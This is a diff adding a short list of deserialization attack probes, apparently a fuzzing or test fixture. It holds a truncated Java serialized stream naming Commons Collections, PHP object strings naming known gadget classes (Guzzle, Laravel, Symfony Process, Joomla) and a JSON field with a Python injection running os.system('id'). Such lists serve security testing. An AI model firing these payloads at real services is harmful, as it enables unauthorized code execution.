@@ -1,0 +1,7 @@
+rO0ABXNyAC1vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUu
+O:30:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:0:"";}}
+O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:5:"event";s:4:"test";}
+O:29:"Symfony\Component\Process\Process":0:{}
+{"rce":"__import__('os').system('id')"}
+aced0005737200116a6176612e6c616e672e496e7465676572
+O:21:"JDatabaseDriverMysqli":0:{}
